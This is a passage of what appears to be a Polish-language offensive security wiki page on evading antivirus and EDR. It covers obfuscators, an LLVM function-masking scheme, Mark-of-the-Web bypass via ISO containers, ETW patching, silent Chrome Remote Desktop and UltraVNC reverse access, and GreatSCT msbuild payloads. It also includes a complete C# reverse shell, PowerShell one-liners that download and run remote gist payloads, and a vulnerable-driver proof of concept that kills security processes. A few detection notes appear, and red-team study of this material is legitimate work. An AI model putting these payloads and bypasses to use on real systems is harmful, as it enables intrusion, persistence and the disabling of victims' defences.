   Flagi:
     • `-p crx` – wybiera profil ConfuserEx 2
     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje stałe ciągi znaków.

3.  Usuwanie proxy-calli – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieczytelnych funkcji opakowujących (`Class8.smethod_10`, …).

4. Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *właściwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV i inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch odtwarza przepływ wykonania **bez** uruchamiania złośliwego próbki – przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznego wstępnego sortowania próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie open-source'owego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania dzięki [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczeniu przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak używać języka `C++11/14` do generowania zaciemnionego kodu w czasie kompilacji, bez korzystania z zewnętrznych narzędzi i modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę zaciemnionych operacji wygenerowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binarny x64, który potrafi zaciemniać różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorphic dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnego code obfuscation dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator zaciemnia program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co podważa nasze naturalne wyobrażenie o normalnym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do shellcode, a następnie je ładować

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant tylko podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje w postaci zamaskowanej XOR-em, gdy są nieaktywne. PoC Function Peekaboo wybiera zdemanglowane nazwy zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden współdzielony handler maskowania w `.text`; sygnatury na poziomie źródłowym i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania backendu

Transformacja powinna odbywać się po wyborze instrukcji i optymalizacji, ponieważ musi obejmować **każdy wygenerowany return** i znać dokładny układ x86. `MachineFunctionPass` uruchamiany przed emisją znajduje ostatnią instrukcję `MachineInstr::isReturn()`, usuwa ją, aby końcowa ścieżka przechodziła dalej do dołączonej epilogu, a wcześniejsze instrukcje return zastępuje przez `JMP_1 handler`. Zachowaj ewentualne wygenerowane przez kompilator instrukcje zwalniania stosu/ramki poprzedzające każdy return; przekieruj tylko samą instrukcję return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emitują stuby dla poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają skokowi w prologu wskazywać późniejszy epilog; w przypadku ręcznie emitowanego bliskiego `je` zapisz `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli niczego nie zmienił; PoC błędnie zwraca w tej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające wskaźnik do funkcji, relokowany przez loader, oraz długość ustalaną w czasie działania, w `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, obejmując długość i jej padding, a rekordy przesuwa o `0x10`. Nazwy sekcji PE mają maksymalnie osiem bajtów, więc wyszukiwanie w czasie działania znajduje `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej poprzedni RVA entry pointa i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przechodzi przez importy PE32+, aby rozwiązać już zaimportowane `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Jej stale czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija wciąż odszyfrowane ciało funkcji. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec transformowanej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub usuwa znacznik i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby odszyfrować ciało funkcji. Końcowa ścieżka przechodzi do dołączonego epilogu, a każdy wcześniejszy return wykonuje skok bezpośrednio do współdzielonego handlera. Zwykły epilog również używa `jmp handler` zamiast `call`, więc po ponownym zamaskowaniu funkcji `ret` handlera pobiera adres powrotu pierwotnego wywołującego i zachowuje wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Prymityw maskowania i wskaźniki analizy

Handler znajduje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia uprawnienia pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia uprawnienia na `PAGE_EXECUTE_READ`. Ta sama pętla odszyfrowuje więc ciało przy wejściu i szyfruje je przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Wskaźniki o wysokiej wartości diagnostycznej dla tego rozwiązania to:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point wewnątrz wykonywalnej sekcji `.stub` oraz sekcja `.funcmet` zawierająca klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, a następnie wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC `call`/`pop` i liczne miejsca return przekierowane do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany uprawnień przez `VirtualProtect` oraz bajtowe zapisy XOR do stron wykonywalnych mapowanych z pliku obrazu.

To obejście skanerów pamięci, a nie ochrona kryptograficzna: załatany plik nadal zawiera oryginalne, niezaszyfrowane ciało funkcji, a debugger może ustawić breakpoint na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` sprawiają również, że odzyskanie kodu offline jest proste.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są współdzielone przez cały proces. Równoległe lub rekurencyjne wejścia mogą więc ponownie przełączać instrukcje podczas wykonywania ich przez inne wywołanie; wyjątki i nielokalne wyjścia również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować przejścia, przywracać ochronę faktycznie zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzać wyrównanie stosu x64 na ścieżkach `call` i `jmp` oraz wywoływać `FlushInstructionCache` po modyfikacji wykonywalnych bajtów. Microsoft wyraźnie przypisuje wywołującemu odpowiedzialność za spójność pamięci podręcznej instrukcji przy modyfikowaniu kodu wykonywalnego.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, który ma chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołują SmartScreen, który ostrzega użytkownika końcowego i uniemożliwia uruchomienie pliku (można go jednak uruchomić, klikając Więcej informacji -> Uruchom mimo to).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu i zawiera URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie strumienia ADS Zone.Identifier pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegania nadaniu payloadom Mark of The Web jest umieszczenie ich w kontenerze, takim jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykład użycia:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm rejestrowania zdarzeń w systemie Windows, który umożliwia aplikacjom i komponentom systemowym **rejestrowanie zdarzeń**. Może być jednak również używany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak można wyłączyć (ominąć) AMSI, można również sprawić, by funkcja **`EtwEventWrite`** procesu działającego w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania zdarzeń. Osiąga się to przez załatanie funkcji w pamięci, tak aby natychmiast zwracała wynik, co skutecznie wyłącza rejestrowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie plików binarnych C# do pamięci jest znane od dawna i nadal jest świetnym sposobem na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania go na dysku, musimy jedynie zadbać o załatanie AMSI w całym procesie.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) umożliwia już bezpośrednie wykonywanie zestawów C# w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu i zakończeniu nowego procesu po zakończeniu działania. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli podczas działania post-exploitation coś pójdzie nie tak lub zostanie wykryte, **znacznie większa jest szansa**, że nasz **implant przetrwa**. Wadą jest **większa szansa** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli podczas wykonywania payloadu coś pójdzie nie tak, **znacznie większa jest szansa**, że **utracimy beacon**, ponieważ może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i zapoznaj się z BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz także ładować C# Assemblies **z PowerShell**. Zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak opisano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Udostępniając pliki binarne interpretera i jego środowisko na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

W repozytorium wskazano, że Defender nadal skanuje skrypty, ale korzystanie z Go, Java, PHP itp. zapewnia **większą elastyczność w omijaniu sygnatur statycznych**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell napisanymi w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może pozwolić procesowi działać dalej, uniemożliwiając mu jednocześnie wykonywanie uprzywilejowanych działań inspekcyjnych lub naprawczych.

Aby temu zapobiec, system Windows może **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie przejąć nad nim kontrolę i utrzymać persistence:<sup>[[35]](#references)</sup>
1. Pobierz aplikację ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla systemu Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj podane polecenie z wymaganymi zmianami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Advanced Evasion

Omijanie zabezpieczeń to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach pozostanie całkowicie niewykrytym jest praktycznie niemożliwe.

Każde środowisko, z którym się zmierzysz, będzie miało własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), które wprowadzi Cię w bardziej zaawansowane techniki omijania zabezpieczeń.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także kolejne świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) na temat wielowarstwowego omijania zabezpieczeń.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwać fragmenty pliku binarnego**, aż **ustali, który fragment Defender** uznaje za złośliwy, a następnie go wyodrębni.\
Innym narzędziem, które robi **to samo, jest** [**avred**](https://github.com/dobin/avred), a usługa jest dostępna w otwartej sieci pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10 włącznie wszystkie wersje systemu Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Skonfiguruj, aby **uruchamiał się** wraz z systemem, i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu** (stealth) i wyłącz zaporę:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (wybierz pobrania binarne, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **ofiarę**

#### **Reverse connection**

**Atakujący** powinien **uruchomić na swoim** **hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do przechwycenia odwrotnego **połączenia VNC**. Następnie na **ofierze** uruchom daemon winvnc: `winvnc.exe -run`, a potem wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UWAGA:** Aby zachować dyskrecję, nie rób kilku rzeczy:

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby uzyskać pomoc, bo wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload XML** za pomocą:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# z użyciem kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Unieszkodliwianie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe o nazwie **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny, podatny na ataki, ale *podpisany* driver** i nadużywa go do wykonywania uprzywilejowanych operacji jądra, których nie mogą zablokować nawet usługi AV chronione przez Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze wnioski
1. **Podpisany driver**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale jest to binarny plik legalnie podpisanego drivera `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ driver ma prawidłowy podpis Microsoft, ładuje się nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwszy wiersz rejestruje sterownik jako **usługę jądra**, a drugi go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTL-e udostępniane przez sterownik**
   | Kod IOCTL  | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia user-mode; kod wykonywany w kernelu może otwierać *chronione* procesy, kończyć je lub modyfikować obiekty kernela, niezależnie od PPL/PP, ELAM czy innych funkcji hardeningu.

Wykrywanie / ograniczanie
•  Włącz listę blokowania podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.
